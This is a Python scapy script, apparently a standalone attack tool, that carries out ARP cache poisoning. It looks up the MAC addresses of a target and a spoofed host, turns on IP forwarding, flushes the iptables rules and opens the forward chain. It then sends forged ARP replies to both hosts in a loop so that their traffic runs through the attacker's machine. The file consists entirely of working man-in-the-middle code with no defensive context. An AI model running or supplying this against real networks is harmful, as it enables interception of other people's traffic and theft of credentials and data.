#!/usr/bin/python3
from scapy.all import *
import time


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class arpSpoof:

    def __init__(self, targetIP, spoofIP):
        self.ipList = [targetIP, spoofIP]
        self.macList = []

    def getMac(self):
        print("\n[+] Acquiring MAC addresses of Targets...\n")

        for i in self.ipList:
            mac = sr(ARP(pdst=i, hwdst="ff:ff:ff:ff:ff:ff"),verbose=False)[0][0][1].hwsrc
            if mac != "":
                print(f"[+] {i} is at {mac}")
                self.macList.append(mac)
            else:
                print(f"[-] Cannot find the MAC Address of {i}.\n[+] Retrying...")
                self.getMac()

    def poisonARPCache(self):
        self.getMac()
        print("\n[+] Enabling packet forwarding on host.\n[+] Backing up iptables current configurations.\n[+] Flush iptables rules.\n[+] Set forward chain default policy of iptables to accept.\n[+] If you have any firewall running please trun off to run this correctly.") 
        os.system("sudo echo 1 >  /proc/sys/net/ipv4/ip_forward && sudo iptables-save > ip.rules && sudo iptables -F && sudo iptables -P FORWARD ACCEPT")

        print("\n[+] Poisoning ARP table. \n[+] Sending poisoned ARP replies.")

        try:
            while True:
                    send(ARP(op=2, pdst=self.ipList[0], psrc=self.ipList[1], hwdst=self.macList[0]), verbose=False) 
                    send(ARP(op=2, pdst=self.ipList[1], psrc=self.ipList[0], hwdst=self.macList[1]), verbose=False)
                    time.sleep(2)

        except KeyboardInterrupt:
            print("\n[*] User Interrupted.\n[+] Restoring the old iptables configuration.")
            os.system("sudo iptables -F && sudo iptables-restore ip.rules && sudo rm ip.rules")

